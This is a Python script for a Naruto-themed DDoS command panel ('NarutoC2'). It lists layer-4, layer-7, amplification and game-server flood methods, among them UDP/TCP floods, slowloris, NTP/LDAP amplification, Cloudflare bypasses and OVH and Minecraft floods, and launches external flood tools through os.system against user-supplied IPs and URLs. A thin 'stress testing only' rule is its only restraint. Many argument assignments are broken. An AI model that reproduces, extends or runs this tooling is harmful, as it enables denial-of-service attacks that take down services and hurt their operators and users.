##############################
# NarutoC2 Made by Hokage    #
# COPY = FORBIDDEN JUTSU     #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''... / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;255;140;0m[ \x1b[38;2;255;255;255mNarutoC2 \x1b[38;2;255;140;0m] | \x1b[38;2;255;255;255mWelcome to Hidden Leaf C2 Dojo! \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mHokage: You \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mUpdate v2.0')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255m🔧 Ninja Tools \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mgeoip               \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mreverse-dns           \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mreverseip           \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mshadow-clone          \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255msubnet-lookup       \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mbyakugan-scan         \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255masn-lookup          \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255msharingan-trace       \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mdns-lookup          \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mchakra-probe          \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255m🎨 Ninja Art   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mnaruto              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mkurama                \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255msasuke              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mleaf-village          \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mkakashi             \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mramen                 \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mitachi              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mrasengan              \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mhokage              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mchidori               \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255m🍃 Ninja Way   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m1. Never give up on your ninja way (dattebayo) \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m3. Protect the Hidden Leaf Village at all costs\x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m4. Only attack stress testing servers         \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m5. Don't steal other ninja's techniques       \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m6. Give a star to show respect to the Hokage  \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m7. The creator protects the village's honor   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255m⚡ Chakra Gates \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m21 - \x1b[38;2;255;255;255mSFTP       \x1b[38;2;255;140;0m69   - \x1b[38;2;255;255;255mTFTP      \x1b[38;2;255;140;0m5060  - \x1b[38;2;255;255;255mRIP  \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m22 - \x1b[38;2;255;255;255mSSH        \x1b[38;2;255;140;0m80   - \x1b[38;2;255;255;255mHTTP      \x1b[38;2;255;140;0m30120 - \x1b[38;2;255;255;255mFIVEM\x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m23 - \x1b[38;2;255;255;255mTELNET     \x1b[38;2;255;140;0m443  - \x1b[38;2;255;255;255mHTTPS                  \x1b[38;2;255;140;0m║   
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m25 - \x1b[38;2;255;255;255mSMTP       \x1b[38;2;255;140;0m3074 - \x1b[38;2;255;255;255mXBOX                   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m53 - \x1b[38;2;255;255;255mDNS        \x1b[38;2;255;140;0m5060 - \x1b[38;2;255;255;255mPLAYSTATION             \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m25565 - \x1b[38;2;255;255;255mMINECRAFT  \x1b[38;2;255;140;0m25565 - \x1b[38;2;255;255;255mMINECRAFT        \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m🌟 Forbidden Jutsu \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mstress              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255msage-mode             \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mreaper-death-seal   \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255meight-gates           \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mtsukuyomi           \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mamaterasu            \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255msusanoo             \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255medo-tensei            \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255mkirin               \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255minfinite-tsukuyomi   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;255;140;0m╔═══════════════╗
                              \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;255m🔥 Fire Style  \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mhttp-rasengan       \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mchakra-bomb           \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mhttp-chidori        \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mhttpflood             \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mninpo-storm         \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mcf-sharingan          \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mbyakugan-bypass     \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mcf-pro                \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mshadow-overflow     \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mhyper                 \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mrinnegan-bypass     \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mslow                  \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mmangekyou-uam       \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255mhttps-spoof           \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255movh-raw             \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255movh-beam              \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;30;144;255m╔═══════════════╗
                              \x1b[38;2;30;144;255m║ \x1b[38;2;255;255;255m💧 Water Style \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mudp-tsunami         \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mtcp-dragon            \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mwater-prison        \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mstd                   \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mudpbypass           \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mdestroy               \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mhome                \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mgod                   \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mslowloris           \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mflux                  \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mstdv2               \x1b[38;2;30;144;255m║   \x1b[38;2;255;255;255mtidal-wave            \x1b[38;2;30;144;255m║
               \x1b[38;2;30;144;255m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;255;165;0m╔═══════════════╗
                              \x1b[38;2;255;165;0m║\x1b[38;2;255;255;255m🦊 Tailed Beast \x1b[38;2;255;165;0m║
               \x1b[38;2;255;165;0m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255movh-amp             \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255mone-tail-shukaku      \x1b[38;2;255;165;0m║
               \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255mminecraft           \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255mnine-tails-kurama     \x1b[38;2;255;165;0m║
               \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255msamp                \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255mldap                  \x1b[38;2;255;165;0m║
               \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255meight-tails-gyuki   \x1b[38;2;255;165;0m║   \x1b[38;2;255;255;255msix-tails-saiken      \x1b[38;2;255;165;0m║
               \x1b[38;2;255;165;0m╚═══════════════════════╩═════════════════════╝
''')

def menu():
    sys.stdout.write(f"         \x1b]2;NarutoC2 --> Shinobi: [{bots}] | Online: [1] | Jutsu:  | Bypass:  | Power: [9999]\x07")
    clear()
    print('\x1b[38;2;255;140;0m[ \x1b[38;2;255;255;255mNarutoC2 \x1b[38;2;255;140;0m] | \x1b[38;2;255;255;255mWelcome to the Hidden Leaf C2 Dojo! \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mHokage: You \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mUpdate v2.0')
    print("")
    print("""
\x1b[38;2;255;140;0m                    ███╗   ██╗ █████╗ ██████╗ ██╗   ██╗████████╗ ██████╗ 
\x1b[38;2;255;140;0m                    ████╗  ██║██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
\x1b[38;2;255;165;0m                    ██╔██╗ ██║███████║██████╔╝██║   ██║   ██║   ██║   ██║
\x1b[38;2;255;165;0m                    ██║╚██╗██║██╔══██║██╔══██╗██║   ██║   ██║   ██║   ██║
\x1b[38;2;255;140;0m                    ██║ ╚████║██║  ██║██║  ██║╚██████╔╝   ██║   ╚██████╔╝
\x1b[38;2;255;140;0m                    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
\x1b[38;2;30;144;255m                                          ╔═╗██████╗ 
\x1b[38;2;30;144;255m                                          ║  ╚════██╗
\x1b[38;2;30;144;255m                                          ╚═╗ █████╔╝
\x1b[38;2;30;144;255m                                            ║██╔═══╝ 
\x1b[38;2;30;144;255m                                          ╚═╝███████╗
\x1b[38;2;30;144;255m                                             ╚══════╝
                \x1b[38;2;255;140;0m╔══════════════════════════════════════════════════════╗
                \x1b[38;2;255;140;0m║      \x1b[38;2;255;255;255m🍃 Welcome to the Hidden Leaf C2 Dojo 🍃      \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m- - - - - - \x1b[38;2;255;255;255mUnleash Your Inner Hokage\x1b[38;2;255;140;0m - - - - - - \x1b[38;2;30;144;255m║
                \x1b[38;2;255;140;0m╚══════════════════════════════════════════════════════╝
                    \x1b[38;2;255;140;0m╔══════════════════════════════════════════════╗
                    \x1b[38;2;255;140;0m║ \x1b[38;2;255;255;255m🍥 Believe it! Type 'help' for all jutsu 🍥 \x1b[38;2;255;140;0m║
                    \x1b[38;2;255;140;0m╚══════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;140;0m╔══[\x1b[38;2;30;144;255mHokage\x1b[38;2;255;140;0m@\x1b[38;2;255;165;0mNaruto\x1b[38;2;255;140;0mC2\x1b[38;2;30;144;255m]
\x1b[38;2;255;140;0m╚\x1b[38;2;255;165;0m═\x1b[38;2;30;144;255m═\x1b[38;2;255;140;0m═\x1b[38;2;255;165;0m═\x1b[38;2;30;144;255m➤ \x1b[38;2;255;255;255m🍥 ''')
        
        if cnc == "fire-jutsu" or cnc == "FIRE-JUTSU" or cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "water-jutsu" or cnc == "WATER-JUTSU" or cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "tail-beast" or cnc == "TAIL-BEAST" or cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "forbidden-jutsu" or cnc == "FORBIDDEN-JUTSU":
            special()
        elif cnc == "ninja-way" or cnc == "NINJA-WAY" or cnc == "rule" or cnc == "RULES" or cnc == "rules":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "chakra-gates" or cnc == "CHAKRA-GATES" or cnc == "ports" or cnc == "port" or cnc == "PORTS":
            ports()
        elif cnc == "ninja-tools" or cnc == "NINJA-TOOLS" or cnc == "tools" or cnc == "tool" or cnc == "TOOLS":
            tools()
        elif cnc == "ninja-art" or cnc == "NINJA-ART" or cnc == "banner" or cnc == "BANNER" or cnc == "banners":
            banners()

        # LAYER 4 METHODS (Water Style)   

        elif "udpbypass" in cnc or "udp-tsunami" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udp-tsunami <ip> <port>')
                print('Example: udp-tsunami 1.1.1.1 80')

        elif "stdv2" in cnc or "water-prison" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: water-prison <ip> <port>')
                print('Example: water-prison 1.1.1.1 80')

        elif "flux" in cnc or "tidal-wave" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                thread = cnc.split()
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: tidal-wave <ip> <port> <threads>')
                print('Example: tidal-wave 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                time = cnc.split()
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                time = cnc.split()
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc or "tcp-dragon" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: tcp-dragon <ip> <port>')
                print('Example: tcp-dragon 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                psize = cnc.split()
                time = cnc.split()
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()
                port = cnc.split()
                time = cnc.split()
                conns = cnc.split()
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()
                port = cnc.split()
                time = cnc.split()
                conns = cnc.split()
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

        # FORBIDDEN JUTSU (Special Methods)

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                mode = cnc.split()
                conn = cnc.split()
                time = cnc.split()
                out = cnc.split()
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('       UDP')
                print('       HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        # TAILED BEAST METHODS (AMP/Games)

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                thread = cnc.split()
                time = cnc.split()
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc or "nine-tails-kurama" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: nine-tails-kurama <ip> <throttle> <threads> <time>')
                print('Example: nine-tails-kurama 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc or "one-tail-shukaku" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: one-tail-shukaku <ip> <port>')
                print('Example: one-tail-shukaku 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                throttle = cnc.split()
                time = cnc.split()
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

        # FIRE STYLE METHODS (Layer 7)
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()
                port = cnc.split()
                time = cnc.split() 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                thread = cnc.split()
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc or "cf-sharingan" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('🍃 Sharingan Activated!')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('🍃 Advanced Sharingan Technique!')
        
        elif "http-socket" in cnc or "http-chidori" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()
                time = cnc.split()
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-chidori <url> <per> <time>')
                print('Example: http-chidori http://example.com 5000 60')

        elif "http-raw" in cnc or "http-rasengan" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-rasengan <url> <time>')
                print('Example: http-rasengan http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc or "shadow-overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()
                thread = cnc.split()
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: shadow-overflow <ip> <port> <threads>')
                print('Example: shadow-overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc or "rinnegan-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                thread = cnc.split()
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: rinnegan-bypass <url> <time> <threads>')
                print('Example: rinnegan-bypass http://example.com 60 1250')

        elif "uambypass" in cnc or "mangekyou-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                per = cnc.split()
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: mangekyou-uam <url> <time> <req_per_ip>')
                print('Example: mangekyou-uam http://example.com 60 1250')

        elif "crash" in cnc or "chakra-bomb" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: chakra-bomb <url> METHODS<GET/POST>')
                print('Example: chakra-bomb http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()
                method = cnc.split()
                time = cnc.split()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

        elif "http-storm" in cnc or "ninpo-storm" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()
                os.system(f'node ninpo-storm.js {url} {time}')
            except IndexError:
                print('Usage: ninpo-storm <url> <time>')
                print('Example: ninpo-storm http://example.com 60')

        # NINJA ART BANNERS

        elif "naruto" in cnc:
            print("""
\x1b[38;2;255;140;0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[38;2;255;140;0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[38;2;255;165;0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[38;2;255;165;0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[38;2;255;140;0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
\x1b[38;2;255;140;0m           🍃 BELIEVE IT! DATTEBAYO! 🍃
""")

        elif "kurama" in cnc:
            print("""
\x1b[38;2;255;165;0m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣦⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;2;255;140;0m           ⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀
\x1b[38;2;255;165;0m           ⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀
\x1b[38;2;255;140;0m           ⠀⠲⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠤⠀
\x1b[38;2;255;165;0m           🦊💥 NINE-TAILS CHAKRA UNLEASHED! 💥🦊
""")

